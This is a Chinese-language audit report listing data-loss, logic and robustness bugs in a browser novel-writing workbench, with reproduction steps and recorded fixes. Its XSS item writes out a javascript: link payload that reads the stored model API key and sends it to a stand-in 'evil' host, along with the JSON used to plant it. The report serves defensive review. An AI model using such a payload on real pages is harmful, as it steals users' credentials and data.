# 小说工作台（novel-workbench-next）漏洞与问题清单

> 审阅日期：2026-09-22 · 分支 `codex/novel-workbench`（HEAD `f7f7a9c`）
> 方法：全量代码审读（src/ 全部 12 个模块 + 3 个 Vue 组件 + vite.config.ts）+ 基线验证（`pnpm test` 99/99、`pnpm build` 通过）+ 浏览器运行时实验。
> 本文档为新增审查产物，未修改任何项目代码与已有文档。
> 标注「已实测」的条目在 dev server + IAB 浏览器中复现过；其余为代码推演，均附可复现路径。

## 严重度说明

- **P0 数据丢失**：用户数据不可逆丢失或静默不持久化。
- **P1 逻辑错误**：功能行为与预期不符（统计虚高、误报、合并矛盾）。
- **P2 健壮性/边界**：异常输入、配额、浏览器兼容性导致的崩溃或异常行为。
- **P3 小瑕疵/设计取舍**：不丢数据但影响体验或存在隐患。

---

## P0 数据丢失与存储配额

### P0-1 五个 localStorage 键共享 ~5MB 配额，各存储的配额处理互不一致，溢出即静默丢数据【已实测】
✅ 已修复（commit 989c3b0）：新增 `src/quota.ts` 统一入口 `writeStorage`（按 UTF-8 字节预检、单次超 5MB 直接拒并给出体积、setItem 失败统一转中文 `StorageQuotaError` 并广播告警），五个保存函数全部改走该入口；App.vue 订阅告警弹 toast，任何一次写失败至少有一次可见提示。总量预算未做累加式预检：单次写入已按 5MB 精确拦截，总量超限由 setItem 精确判定并以同一中文口径告警，避免大配额浏览器被误拦。
- 位置：`src/storage.ts:194-196`（`saveData` 无保护）、`src/breakdown.ts:692-694`（`saveBreakdownStore` 无保护）、`src/workflow.ts:80-83`（`saveWorkflowArchive` 无保护）、`src/rank.ts:669-673`（`saveRankStore` 静默 catch）、`src/prefs.ts:22-24`（`saveEditorPrefs` 无保护，字号按钮同步调用，App.vue:815-818）。
- 容量测算（均写在代码常量里）：
  - 榜单库 `rank-v1`：`RANK_MAX_SNAPSHOTS=400` × `RANK_MAX_ITEMS=200`（rank.ts:185-186），单条快照 JSON 约 60–100KB，理论上限 24–40MB，远超配额。
  - 拆书库 `breakdown-v1`：`BREAKDOWN_MAX_PROJECTS=30` × `BREAKDOWN_MAX_CHAPTERS=200`，且每章最多保留 `BREAKDOWN_MAX_PARAGRAPHS=2000` 段原文（breakdown.ts:143-145, 253, 257）——单项目理论可达 20MB 量级。
- 行为分歧：
  - `saveRankStore` 捕获后**静默失败**（注释自认「存储写满时静默失败」）→ 榜单数据只活在内存里，刷新即丢，界面毫无提示。
  - `saveBreakdownStore` / `saveWorkflowArchive` / `saveData` **不捕获** → QuotaExceeded DOMException 沿调用链乱飞（见 P0-2、P0-3、P1-6），或被 Vue watch 吞掉变成控制台未处理异常。
  - `saveEditorPrefs`（prefs.ts:22-24）同样不捕获，且在字号按钮的点击处理器里同步调用（App.vue:815-818）→ 配额已满时（前四个键挤占后很常见）点击 A−/A＋ 直接抛未处理异常：字号在内存里其实已改，但永远不落盘，且用户连错误提示都没有（异常发生在事件处理器里被 Vue 吞掉）。这是第 5 种不一致行为，也是唯一一条「配额满时反而连 1KB 偏好都写不进」的路径。
- 影响：用户长期积累榜单/拆书后，某个存储写满的那一刻起，后续所有数据变更只存在于内存，页面一刷新全部消失，且无任何警告。
- 复现：dev server 下在控制台 `const orig = Storage.prototype.setItem; Storage.prototype.setItem = function(...a){ const e=new DOMException('artificial','QuotaExceededError'); e.name='QuotaExceededError'; throw e };` 后触发任意一次持久化（写一段正文/抓一份榜单）。
- **实测证据**（IAB 浏览器，dev server 127.0.0.1:6793）：仅对 `rank-v1` 键注入 QuotaExceeded 后走「手动导入七猫 JSON」——界面显示「已导入 2 条」、弹窗关闭、无报错，但 `rank-v1` 键根本不存在；刷新页面后 2 条快照彻底消失，榜单页回到「还没有快照」，全程无任何提示。
- 建议：统一配额处理——写前预检 `JSON.stringify` 长度并对总量做预算；写失败时至少给用户一次可见告警（toast），而不是四种存储四种行为。

### P0-2 拆书批量拆解中 persist() 无保护：配额错误被误报成「章节拆解失败」并中断整批【已实测】
✅ 已修复（commit 0668cd7）：persist 返回布尔后批处理不再被写异常打断，落盘失败在工作台错误区弹中文警示（结果仅在内存、刷新即丢），章节状态与 AI 调用照常推进。
🔶 配额溢出部分由 P0-1 缓解（commit 989c3b0）：persist 改返回布尔值，错误落入本页错误区且为中文口径，不再抛英文 DOMException、不再出现未处理 rejection；「章节停在 processing、整批无解释中止」待本条修复。
- 位置：`src/BreakdownView.vue:458-485`（`persist()` 在 462、483 行；462 行在内层 try 之前，483 行在 try 外）。
- 行为：`saveBreakdownStore` 抛 QuotaExceeded 时：
  - 462 行的抛出**不在任何 try 内**（它先于内层 try 执行）→ 直接跳出 for 到 finally，整批中止；章节停在 `processing`，进度条消失，界面无任何解释。
  - 483 行的抛出同样无人接 → 同后果。
  - 同路径下 `importTxt` 的 persist 被 catch 后，错误区显示的是**原始 DOMException 文本**（见 P0-1 实测），用户无从区分「AI 出错」与「存储写满」。
- **实测证据**（对 `breakdown-v1` 键注入 QuotaExceeded）：导入 TXT「测试书」→ 错误区出现 `The user is over the storage quota limit.`，项目卡片仍进列表（内存态）；进工作台点「拆解 2 章」→ 批处理**立即中止、未发起任何 AI 调用**，页面捕获到未处理的 `QuotaExceededError` rejection；刷新后「测试书」从磁盘消失。
- 复现：同 P0-1 注入 QuotaExceeded，然后在拆书页导入 TXT 并点「拆解 N 章」。

### P0-3 「覆盖恢复」链路中 saveBreakdownStore 无保护：恢复看似成功、重载后旧数据复活
✅ 已修复（commit 0668cd7）：覆盖/合并恢复的各存储写入包进 try，任一写失败后 dataEpoch、重选书、flushSave、提示照常执行，备份提示如实显示「恢复内容已载入，但写入本机失败：…」，静默回滚消除。
🔶 配额溢出部分由 P0-1 缓解（commit 989c3b0）：写失败不再静默、不再只抛英文异常，App 会弹中文 toast；「内存已换但落盘失败导致恢复静默回滚、dataEpoch/flushSave 被跳过」待本条修复。
- 位置：`src/App.vue:1527-1531`（`handleBackupImport` 的 overwrite 分支：`saveRankStore(...)` 静默吞掉配额错误后，`saveBreakdownStore(...)` 若抛出，则其后所有语句被跳过——`dataEpoch += 1`、重选书/章、`flushSave()`）。
- 行为：主数据 `data.value` 已被备份替换进内存，但落盘失败被抛出 → 内存与磁盘不一致。用户看到「已恢复」提示，刷新页面后 localStorage 里的旧数据被 `loadData` 读回——**恢复静默回滚**，无任何提示。
- 同链路：`saveWorkflowArchive(backup.workflow)`（App.vue:1528）也 unprotected，先于 saveBreakdownStore 抛出的话后果相同。
- 同机制在「合并」分支同样成立（P0-3 标题只写了覆盖恢复，但代码上是同一类缺陷）：`handleBackupImport` 合并分支 App.vue:1533-1545 先 `data.value = merged.data`（1534，内存已被换），随后 `saveWorkflowArchive`（1537）与 `saveBreakdownStore`（1545）同样无保护、外层无 try/catch——任一抛 QuotaExceeded 都会跳过其后的 `dataEpoch += 1`、`flushSave()`（1551/1558）与 toast（1559），用户看不到任何提示，刷新后主数据回到旧值而 workflow/rank/breakdown 可能已部分落盘，形成更隐蔽的三方不一致。
- 复现：QuotaExceeded 注入 + 触发「覆盖恢复」+ 刷新页面。
- 机制说明：未捕获的 `saveBreakdownStore` 抛出直接掐断调用链、后续语句（`dataEpoch += 1`、`flushSave()`）被跳过的行为，已在 P0-2 的拆解批处理实验中实测验证；本条为同一机制在覆写恢复链路上的应用，未单独对备份导入文件流做实测（IAB 不支持文件选择器注入）。

### P0-4 主数据损坏时静默返回空状态，自动保存随即把损坏数据覆盖掉【已实测】
✅ 已修复（commit 66cf742）：`loadData` 检出解析失败或结构不符时，先把原文搬到暂存键 `novel-workbench-next/v1-corrupt`（最多 3 份）再返回空状态，自动保存再也碰不到原文；启动时弹中文 toast 说明暂存位置。暂存区已满或暂存失败时保留主键原文并拒绝写入，用户确认覆盖恢复时才解除保护。
- 位置：`src/storage.ts:182-196`（`loadData` 捕获 JSON.parse 失败后 `return` 全新空数据；190 行注释自认「损坏数据保留在浏览器里，避免自动覆盖」）+ `src/App.vue:1038-1045`（对 `data` 的 350ms 防抖 deep watch → `flushSave` → `saveData`）。
- 行为：localStorage 里 `novel-workbench-next/v1` 一旦损坏（写入中途断电、多标签页竞争写入等），App 启动时读不到就**当作用户没有数据**，350ms 后自动保存把空状态写回同一个键——损坏但可能手工恢复的数据在数秒内被不可逆抹掉，且界面上只呈现「空白工作台」，没有任何「检测到损坏数据」的提示。注释声明的「保留」承诺与实际行为直接矛盾。
- 复现（node 单元级，仓库 loader 直接驱动 `loadData`/`saveData`）：键写入截断 JSON `{"version":2,"books":[` → `loadData()` 返回**全新空状态**（books 为空、无任何损坏标记）→ App 的 350ms deep-watch 自动保存随即 `saveData(空状态)` 写回同一键，截断原文被不可逆替换。
- 实测证据（浏览器）：键损坏后刷新，页面呈现空白书架、**无任何「检测到损坏数据」提示**；键内容在 ~1.6s 内变成合法完整 blob，损坏原文被抹掉。
- 需要如实说明的一个缓解因素：`App.vue:1077` 在 `beforeunload` 调 `flushSave()`——**正常刷新**时，内存里的完整数据会在卸载瞬间回写一遍，往往能「救回」键里刚发生的损坏（实测手动写哨兵值再刷新，哨兵会被 beforeunload 抹掉、原数据恢复）。因此真正的丢失窗口是：**损坏能存活到下次冷加载**的情形——进程被强杀/断电（beforeunload 不执行）、大 blob 写入中途配额失败留下半截数据、多标签页竞争写。这些场景下下次加载即走 catch→空状态→自动保存覆盖，全书库无声蒸发。

---

## P1 逻辑错误

### P1-1 恢复历史版本后统计数据虚高（手写字数被整段回填）【已实测】
✅ 已修复（commit 252a777）：restoreVersion 恢复内容后同步刷新 chapterLengths，不再把整段差值误记为手写。
- 位置：`src/App.vue:1357-1366`（`restoreVersion` 只更新 `content` 与 `updatedAt`，不更新 `chapterLengths`）对比 `src/App.vue:1331-1340`（`touchChapter` 用 `chapterLengths` Map 差值记账，Map 定义在 795 行）。
- 行为：`chapterLengths` 在打开章节时记录一次（`watch(selectedChapterId, rememberChapterLength)`，App.vue:798），之后只有 `touchChapter` 会更新。用户把章节清空再恢复一个较长历史版本后，Map 里留的是清空时的旧小值；下一次手动敲 1 个字符时 `touchChapter` 算出 `current - 旧小值` 的整段差值，全部记入**当天手写字数**。AI 采纳路径（`adoptProduction`，App.vue:1336）正确更新了 Map，唯独 restoreVersion 漏掉。
- 复现：建书→写 N 字→存版本→把正文清空→恢复旧版本→再手打 1 字→统计页当天手写字数多出 ≈ N。
- **实测证据**：写入 82 字（记 +82）→ 存版本 → 清空 → 恢复 82 字版本（Map 仍停在清空时的 0）→ 手打「字。」2 字符 → 统计页「今日字数 手写 166」。实际手写投入是 82+2=84 字，却被记成 166，整段 82 字被误记为手写。
- 建议：restoreVersion 末尾补 `chapterLengths.set(chapter.id, countWords(content))`。

### P1-2 重新导入同一份建书存档 → 记录成倍重复
✅ 已修复（commit 443b394）：importWorkflowArchive 保留源 ID，导入时按 ID 跳过本机已有记录并提示跳过条数。
- 位置：`src/workflow.ts:88-101`（`importWorkflowArchive` 给每条记录重新分配 `uid()`）+ `src/App.vue:1179`（新记录前置进 `records`）。
- 行为：导出→（换机器或误操作）→再导入同一文件，由于去重完全依赖 ID 而 ID 每次都被重建，无法识别「这条已经导过了」，历史记录列表里同一份作品档案出现两份。重复导入 N 次就 N 份。
- 建议：以内容指纹（如 title+idea+updatedAt 组合哈希）去重，或至少对「相同 title+completedAt」提示重复。

### P1-3 合并恢复时「取较大值」让旧备份的大目标值覆盖当前小目标值
✅ 已修复（commit 252a777）：合并恢复的 dailyGoal 以当前设备设定为准，不再取较大值。
- 位置：`src/backup.ts:111`（`mergeStatsKeepLarger` 中 `Math.max(base.dailyGoal, incoming.dailyGoal)`）。
- 行为：合并模式恢复一份半年前 dailyGoal=5000 的备份，当前是 800/天 → 恢复后目标被悄悄抬到 5000。进度条（App.vue:126 `goalPercent`）随之失真。语义上「保留更大目标」与「保留用户当前设定」正好相反。
- 同类问题：dailyGoal 只有 dailyGoal 一个字段走 keep-larger，`days` 统计是逐日合并，影响可控，但目标值这一项方向反了。

### P1-4 榜单快照合并实际会「覆盖」，但恢复提示只报「新增」
✅ 已修复（commit 252a777）：mergeSideStores 把新增与更新分开计数（updatedRank/updatedBreakdown），恢复提示如实显示「新增 X 份、更新 X 份」。
- 位置：`src/backup.ts:168-182`（`mergeSideStores` 注释与提示语称「本地已有的不覆盖」）对比 `src/rank.ts:1118-1126`（`mergeRankSnapshots`：同 sourceId+statDate 且 incoming.fetchedAt 更新时**替换**本地快照）。
- 行为：恢复含更新抓取时间的同日期快照时，本地那份被顶掉；但 `addedRank` 计数按「键集合差」统计（只数新键），被替换的部分不计入 → 恢复完成提示「新增 X 份快照」少报了实际发生的变更。与 backup.ts 的注释承诺矛盾。
- 同类：breakdown 侧 `mergeBreakdownProjects` 的 added 计数口径需一并核对。

### P1-5 `finish_reason: 'length'` 直接整条丢弃，不抢救已返回的片段
✅ 已修复（commit 84e3ebb）：finish_reason=length 时非空片段照常返回不再丢弃，新增 onTruncated 回调；逐章生文的截断候选在 toast 与候选卡说明中标注「未写完」。
- 位置：`src/ai.ts:57`。
- 行为：模型在截断前往往已输出数百分之一的有效正文（尤其 `generateChapterProse` 这类长文任务，上限 6500 tokens ≈ 2000 中文字，见 P3-4）。当前实现把整次调用判为失败、候选不保留，提示语「已有草稿不会丢失」指的是旧候选，新产的截断片段被扔掉。
- 建议：截断时对已返回内容做 `choices[0].message.content` 抢救（trim 后非空即作为截断候选入库并标注「未写完」）。

### P1-6 创建工作时 QuotaExceeded 以原始英文 DOMException 形式误报
🔶 配额溢出部分由 P0-1 缓解（commit 989c3b0）：同一处错误现在以中文 `StorageQuotaError` + toast 呈现，用户能区分「AI 出错」与「存储写满」；「表单未重置、作品未入库」的状态半残待本条修复。
- 位置：`src/App.vue:1211-1231`（`finishWorkflow`：`saveData` 在 try 内（1214 行））。
- 行为：存储写满时 `localStorage.setItem` 抛出 `DOMException: Failed to execute 'setItem' on 'Storage': ...`，被 1226 行 catch 原样塞进 `workflowError`——用户看到英文浏览器异常文本，误以为「创建作品」这个操作本身出错；且 `created` 书对象已被构造但未入 `data.value.books`，工作流表单也未复位（1215-1224 全部没执行到），状态半残。
- 关联 P0-1。

### P1-7 拆书存档（.json）再导入 → 同名项目成倍重复【库里已实际发生】
✅ 已修复（commit 443b394）：importBreakdownStore 保留源 ID，导入时按 ID 跳过已有项目并提示「已导入 X 个、跳过 N 个重复」。
- 位置：`src/breakdown.ts:701-714`（`importBreakdownStore` 给每个项目 `newId()` 重建 ID，710 行）+ `src/BreakdownView.vue:396`（导入后 `[...imported, ...projects]` 前置，无内容去重）。
- 行为：同一份「拆书存档.json」导入两次（换电脑恢复、备份习惯、误操作），第二次导入的所有项目拿到全新 ID，项目列表里同名同内容的《X》并排两份；30 项目上限（P2-5）还会被重复项目提前占满，挤掉真正的新书。
- 实测证据：本次测试所用 dev 源（127.0.0.1:6793）的 `breakdown-v1` 键里就存着两份完全同名的「钟声之外」（3 章、均已拆解，内容一致）——即同份存档被导入两次的真实产物。
- 对照：备份合并路径有去重（`breakdown.ts:716-724` `mergeBreakdownProjects` 按 ID 归并，且备份取数 `breakdownProjectsFromBackup` 不重分配 ID，注释明说「避免同一份备份重复导入越攒越多」）；唯独「导入拆书存档.json」这条入口走 `importBreakdownStore` 重建 ID，漏了去重。
- 建议：`importBreakdownStore` 前按 `title+updatedAt` 或章节内容指纹与现有项目比对，跳过重复并提示「已跳过 N 个重复项目」。

### P1-8 榜单条目的 `bookUrl` 未做 scheme 校验，可注入 `javascript:` 触发 XSS【已实测】
✅ 已修复（commit 9258e48）：safeHttpUrl 协议白名单（http(s) 与站点内相对路径）在七猫粘贴、存档导入两入口统一收口 bookUrl/coverUrl/lastChapterUrl，危险协议回退或剔除，不再触达渲染层。
- 位置：`src/rank.ts:535`（七猫 JSON 粘贴路径 `String(row.book_url||'').trim()`，非空即原样保留）与 `src/rank.ts:594`（存档导入 `normalizeItem` 中 `String(row.bookUrl||'').trim()`），两者均不校验协议；渲染点 `src/RankView.vue:122`（`<a :href="row.bookUrl" target="_blank">`）。
- 行为：手动导入一段七猫 JSON（或导入一份榜单存档），其中某条 `book_url`/`bookUrl` 写成 `javascript:fetch('https://evil/?k='+encodeURIComponent(localStorage.getItem('novel-workbench-next/v1').model.apiKey))`——该快照正常入库并展示，用户点击书名链接即在本机页面执行该脚本，可外带 localStorage 里的**模型 API key** 与全部作品数据。`target="_blank"` 无法阻止同文档 `javascript:` 执行。
- 对照：番茄 HTML 抓取路径（rank.ts:467）经 `toAbsoluteUrl` 前缀拼接（非 http(s) 会拼成 `base/javascript:...` 的废 URL），意外免疫；唯独两个「用户可手填」的 JSON 入口没有这道保护。
- 复现：扫榜页「手动导入」→ 粘贴 `{"data":{"table_data":[{"book_id":"1","title":"诱饵","book_url":"javascript:...","number":"1"}]}}` → 点进详情 → 点书名。
- **实测证据**（未实际点击，仅验证载荷落地）：粘贴 `book_url` 为 `javascript:MARKER_XSS_PAYLOAD` 的七猫 JSON → 界面显示「已导入 1 条」，`rank-v1` 键原样存入该载荷；详情页渲染出的书名锚点读回 `a.href === "javascript:MARKER_XSS_PAYLOAD"`——浏览器不会在点击前拦截 `javascript:` 锚点，点击即在本页执行任意 JS（同文档可完整读取 localStorage，含模型 API key）。
- 建议：入库/渲染前统一做 scheme 白名单（仅放行 `http:`/`https:`，其余置空或显示为纯文本）；`coverUrl`（`<img :src>`）虽不可直接执行 JS，建议一并收口。

### P1-9 扫榜主抓取路径自带禁头：主流浏览器里「抓取」必败，生产部署无可用抓取入口
✅ 已修复（commit 16cb104）：抓取请求移除 User-Agent 禁头（Firefox 等引擎 fetch 直接抛 TypeError，Chrome 静默剥离永不生效），删除无用常量；直连与代理路径都能正常发请求。
- 位置：`src/rank.ts:1163-1167`（`fetchRankText` 手动附加 `'User-Agent': BROWSER_UA`，常量定义在 205 行）+ `src/rank.ts:1145-1153`（`proxyPathFor` 仅放行两个 host；vite 代理只在 dev 存在，vite.config.ts:5-12）。
- 行为：`User-Agent` 是 Fetch 规范的**禁用请求头**，Chrome/Edge/Firefox 等在构造请求时直接抛 `TypeError: Refused to set unsafe header 'User-Agent'`——`fetchRankText` 的两次尝试（代理 + 直连）全部在同一行死掉，`crawlRankSnapshot` 永远以「抓取失败（…浏览器跨域限制）」收场，用户拿不到任何快照。生产部署（`vite build` 静态托管）连 `/rank-proxy` 前缀都不存在，`proxyPathFor` 返回 null → 只剩跨域直连 → 再被 CORS 拦死。即：**只有「dev 环境 + 对禁头宽松的浏览器」这一种组合能抓到数据**；标准浏览器里该功能等于不存在，唯一可靠入口是手动粘贴导入。
- **实测证据**（本环境为宽松浏览器，故只能证明"代理通、直连死"半边）：`fetch('/rank-proxy/fanqienovel.com/rank/')` → **200**，正文是番茄榜单 HTML（dev 代理可用）；`fetch('https://fanqienovel.com/rank/')` → `TypeError: Failed to fetch`（CORS）；本环境带 `User-Agent` 头的 fetch 未抛错——Chrome/Edge 里同句必抛（Fetch 规范禁用头），故抓取的可用性完全取决于宿主浏览器是否强制执行该规范。
- 建议：去掉 `User-Agent` 头（浏览器 fetch 本就不允许自定义它，去掉后代码在所有浏览器行为一致，保留 `Accept` 即可）；文档写明「抓取」依赖 dev 代理，生产环境以手动粘贴为准。

### P1-10 作品 JSON 重复导入全部重建 ID，同名同内容作品成倍堆积且编辑分叉
✅ 已修复（commit 443b394）：importBookJson 保留 book id（碰撞才重建），导入前按「书名+概念+首章标题」指纹弹确认。
- 位置：`src/storage.ts:222-251`（`importBookJson` 无条件 `uid()` 重建 book/chapter/lore/chat/candidate 全部 ID，251 行 `id: uid()` 不尝试复用源文件里的 `source.id`）+ 入口 `src/App.vue:1480-1493`（`handleImport` 导入前不比对现有作品）对比 `src/backup.ts:137-138`（备份合并按 book id 去重——但那条去重对**重建了 ID 的作品 JSON 导入路径完全失效**）。
- 行为：导出《X》→ 换设备/备份习惯/误操作 → 再导入同一文件 → 书架并排两部同名同内容《X》（ID 全新一套），无任何重复提示。此后用户在两份之间各改各的，字数统计按 bookId 分账（stats.ts `recordWords`）自然劈成两路，quota 占用翻倍（P2-16 放大），且备份合并时这两份都算「本地已有」、导入的备份副本又被去重掉——三份数据的对应关系无从追溯。与 P1-2（建书记录）、P1-7（拆书项目）同族的 ID 重建去重失效问题，发生在数据量最大的作品层。
- 建议：`importBookJson` 保留源文件 book id（碰撞时再重建）；`handleImport` 前按「title + premise + 首章标题」指纹匹配现有作品，命中则提示「检测到疑似重复，已跳过 / 仍要导入」。

---

## P2 健壮性与边界

### P2-1 主数据校验过浅，手改/损坏 localStorage 可致运行时崩溃【部分已实测】
✅ 已修复（commit ef4c170）：normalizeProjectData 对 books 逐章逐条修复——缺 content 补空串、缺 updatedAt 补书级时间、缺 ID 重建，非对象章节/设定/对话/历史坏条目就地剔除；备份导入走同一归一化。策略是「修复而不是拒收」，避免一个坏章节把整库判成损坏。
- 位置：`src/storage.ts:198-206`（`isProjectData` 只查顶层与 book 一级字段）+ `src/storage.ts:137-146`（`normalizeProjectData` 中 `books` 原样透传）+ 崩溃点 `src/ai.ts:75`（`chapter.content.slice(-5000)`）**与 `src/App.vue:639`（`latestChapter` 的 `b.updatedAt.localeCompare`）**。
- 行为：`v1`/`v2` 键里 chapter 缺 `content` 字段（手改或写坏）时，类型系统挡不住；任何引用 `chapter.content` 的路径（AI 上下文、正文对比、版本历史 diff）直接 TypeError。与 P0-4 叠加：损坏→清空→重建后老章节数据其实可以手工修回，但校验不深就修不回来。
- **已实测（章节缺 `updatedAt` 的"假死"链）**：v1 写入一本书、2 个章节均缺 `updatedAt`（`isProjectData` 只验数组，照样通过）→ 应用能正常启动进工作台（初始选章走数组下标，不经过 `latestChapter`）；但点「作品书架」导航后，书架模板 `latestChapter(item)`（App.vue:197）抛 `TypeError: Cannot read properties of undefined (reading 'localeCompare')`，整次重渲染失败——**页面冻结在原来的工作台，书架不显示、无任何错误提示**；点侧栏切换作品（`selectBook`，App.vue:1253）同点抛错，永远切不走。控制台直接复现该排序表达式得到同一 TypeError。
- **注入路径不止手改 localStorage**：`parseWorkspaceBackup` → `normalizeProjectData`（backup.ts:90）books 同样原样透传，导入一份畸形备份文件即可让应用落进同一状态（与 P2-2 同类，备份是比手改更现实的注入通道）。

### P2-2 备份里的 draft 原样透传：历史列表与建书页多个崩溃点
✅ 已修复（commit 4fe5279）：normalizeBackupRecord 对 draft 走 normalizeDraft，缺字段补空、step 越界重置、draft 非对象剔除；历史列表与建书页的崩溃点消除。
- 位置：`src/backup.ts:59-72`（`normalizeBackupRecord` 只检查 draft 是对象（65 行），69 行 `draft: source.draft` 原样透传）+ 崩溃点 `src/App.vue:69`（`workflowRecordTitle` → 601 行 `record.draft.title.trim()`）、`src/App.vue:70`（模板 `parseChapterPlan(record.draft.outline).length`）、`src/App.vue:30/52`（建书页 `workflowSteps[workflow.step - 1].title`、`:disabled="!workflow.title.trim()"`）、`src/workflow.ts:117/119/121`（`buildBookFromWorkflow` 的 `draft.title.trim()`、`(draft.idea || draft.seed).trim()`、`content.trim()`）。
- 行为：备份 JSON 里 draft 缺字段（如 `draft: {}` 或 `outline` 是对象）时——① 打开「记录」历史列表，69 行 `workflowRecordTitle` 对缺失的 `title` 做 `undefined.trim()` 抛 TypeError（与 P2-1 实测冻结链同机制：整次重渲染失败、页面冻在原屏）；`outline` 非字符串时 70 行 `parseChapterPlan`（workflow.ts:105 的 `.split`）同样崩；② 点对该记录「继续编辑」（App.vue:71 → `resumeWorkflowRecord` 1131 行 `workflow.value = {...record.draft}`）后，step 缺失/越界时 30 行 `workflowSteps[step - 1]` 为 undefined → `.title` 抛错，title 缺失时 52 行 `!workflow.title.trim()` 同点抛错 → 建书页冻结；③ title 在而 idea/seed/outline 缺失时点「创建作品」（`finishWorkflow` → `buildBookFromWorkflow`）在 119/121 行抛**英文原始 TypeError**，被 App.vue:1230 捕获后经 workflowError 显示（P1-6 同类）。
- 根因（四入口不一致）：建书记录的其余三个入口都让 draft 过 `normalizeDraft`（workflow.ts:62 localStorage 加载 / 72 旧版草稿 / 97 导入记录），**唯独全量备份通道**（App.vue:1529 覆盖 / 1535 合并 → backup.ts:69）原样透传 → 同一条记录在一个入口自愈、在另一入口投毒；且投毒后的记录可经 `duplicateWorkflowRecord`（App.vue:1140 `createWorkflowRecord` 不重新归一化）放大、经 `exportWorkflowRecords` 导出后在别的机器上走备份通道再次感染。（原 P2-2「step 非数字时只会被展示、影响小」仅对历史列表层成立，建书页是崩溃点。）
- 建议：`normalizeBackupRecord` 的 draft 处理与 `importWorkflowArchive` 对齐（改走 `normalizeDraft`），一行消掉上述全部崩溃点。

### P2-3 章节规划静默截断到 20 章
✅ 已修复（commit 30759b1）：大纲章节数上限 20 → 200（MAX_PLAN_CHAPTERS），长篇规划完整建进目录。
- 位置：`src/workflow.ts:111`（`if (result.length === 20) break`，`parseChapterPlan`）+ 使用点 `src/workflow.ts:128`（`buildBookFromWorkflow`）。
- 行为：大纲写 100 章规划，建书时只生成前 20 章，余下 80 章规划**只存在于 lore 的「故事主线与章节规划」文本里**，且无任何截断提示。用户以为 100 章都在目录中。
- 建议：要么放开上限，要么在界面明示「仅导入前 20 章」。

### P2-4 拆书报告 prompt 无截断，200 章的书极易超上下文
✅ 已修复（commit 84e3ebb）：bookReportPrompt 单条摘要 300 字、总量 24000 字预算，超限在 prompt 内标注「仅收录前 X / Y 章」。
- 位置：`src/BreakdownView.vue:500-511`（`generateReport` 把所有 done 章节的 summary+rhythm 拼进 user prompt，`maxTokens: 3600` 限制的是输出）。
- 行为：200 章 × 每章摘要约 200-400 字 ≈ 40-80K 字符输入，多数 8K/32K 上下文模型直接报 context length 错误，且错误信息对用户没有可操作提示。
- 对比：章节级拆解有 `BREAKDOWN_PROMPT_PARAGRAPH_LIMIT` 截断（BreakdownView.vue:468），唯独报告没有。

### P2-5 拆书库 30 项目上限：导入时旧项目被静默丢弃
✅ 已修复（commit 30759b1）：导入触发 30 项目上限时提示「已丢弃最旧的 N 个项目」。
- 位置：`src/BreakdownView.vue:367`（TXT 导入 `[project, ...projects].slice(0, 30)`）、`396`（JSON 导入 `[...imported, ...projects].slice(0, 30)`）。
- 行为：满 30 个项目后再导入，被挤出去的项目（TXT 路径是**最旧的项目**）直接消失，无任何「已丢弃 N 个项目」提示。用户以为导入成功且旧项目还在。
- 注意 `saveBreakdownStore` 落盘时（breakdown.ts:693）也有同一 slice，即内存里短暂存在过的溢出项目刷新后必丢。
- 全量备份通道豁免此上限：`breakdownProjectsFromBackup`（breakdown.ts:727-735）不检查项目数，覆盖分支（App.vue:1531）可把备份里任意多个项目直接存库（合并分支经 `mergeBreakdownProjects` 717-724 行会裁回 30）——30 上限只在「拆书页直接导入」一条路上生效。

### P2-6 多个导入入口无文件大小上限，巨型输入可冻结标签页
✅ 已修复（commit 30759b1）：拆书 TXT ≤10MB、拆书 JSON/扫榜存档 ≤20MB、粘贴 ≤5MB 的入口闸全部补齐。
- 位置：`src/BreakdownView.vue:387-402`（拆书存档导入）、`src/RankView.vue:619-631`（榜单存档导入，`JSON.parse(await file.text())` 无 size 检查）、`src/RankView.vue:572-587` + `src/rank.ts:1289-1327`（榜单**粘贴导入**：`pasteText` 无长度闸，`parseRankPaste` 在主线程对整段文本跑正则/`JSON.parse`）。
- 对比：主备份有 50MB 闸（backup.ts:9 + App.vue 的 `file.size > BACKUP_SIZE_LIMIT` 检查），建书记录 20MB 闸，唯独这三个入口裸奔。几 GB 的 JSON 会 `file.text()` 全量进内存 + 同步 parse，标签页直接卡死/崩溃；粘贴入口同理——用户从浏览器另存一份带完整脚本的大 HTML 页粘进来，正则解析即可冻结页面数秒到数十秒。

### P2-7 拆书页拖拽接受任意文件类型
✅ 已修复（commit 30759b1）：拖拽入口验类型，只收 TXT/纯文本。
- 位置：`src/BreakdownView.vue:381-385`（`handleDrop` 直接读拖入文件；`accept=".txt"` 只约束文件选择器）。
- 行为：把 .pdf / .exe / 图片拖进拆书页会被当 TXT 读（二进制 → 编码探测失败 → 大概率「无法正确读取」，也可能读出乱码建出一个垃圾项目）。

### P2-8 批量拆解进行中删除当前项目
✅ 已修复（commit 3b78cc2）：批处理进行中禁止删除项目并提示。
- 位置：`src/BreakdownView.vue:418-424`（`removeProject` 不检查 running）+ `450-490`（`runBatch` 闭包持有被删项目的引用）。
- 行为：项目被移出 store，但批处理循环继续对这个游离对象改 `status/analysis` 并 `persist()`（persist 写的是 store，游离改动不落盘）→ 用户看到进度条走、章节变色，其实全白跑；批次结束后该项目的拆解成果全部丢失且无提示。

### P2-9 停止批拆解：被停的那章被标记为 failed 且报错文案是原始 AbortError
✅ 已修复（commit 3b78cc2）：停止时当前章退回 wait，不再出现红色 failed 与 AbortError 文案。
- 位置：`src/BreakdownView.vue:471-484`（abort 后 fetch 抛 AbortError → 内层 catch 479-480 标记 `failed`，errorMessage 为 `AbortError`/`The operation was aborted.` 之类原始文本；484 行 `if (signal.aborted) break`）。
- 行为：用户主动「停止」，界面上却出现一条红色 failed 章节，报错文案像在说 AI 出错了。刷新后 `normalizeBreakdownChapter`（breakdown.ts:610）把残留 processing 转 failed，文案不变。
- 建议：abort 路径单独分支，把该章置回 `wait`。

### P2-10 素材收集不去重，60 条/类上限被近重复条目灌满；空 desc 关系被静默丢弃
✅ 已修复（commit 3b78cc2）：素材完全同内容去重，relations 空 desc 退回关系文本兜底。
- 位置：`src/breakdown.ts:314-357`（`collectBreakdownMaterials`）。
- 行为：200 章反复出现「人物关系」「节奏」条目时，上限先被重复内容占满，真正多样的素材进不来；`relations` 中 `desc` 为空的条目被过滤后无替代兜底，人物素材整体变少。

### P2-11 「第零章」在已有章节号之后被拒
✅ 已修复（commit 9258e48）：第零章不再按回指拒绝，前后出现都切为独立章节。
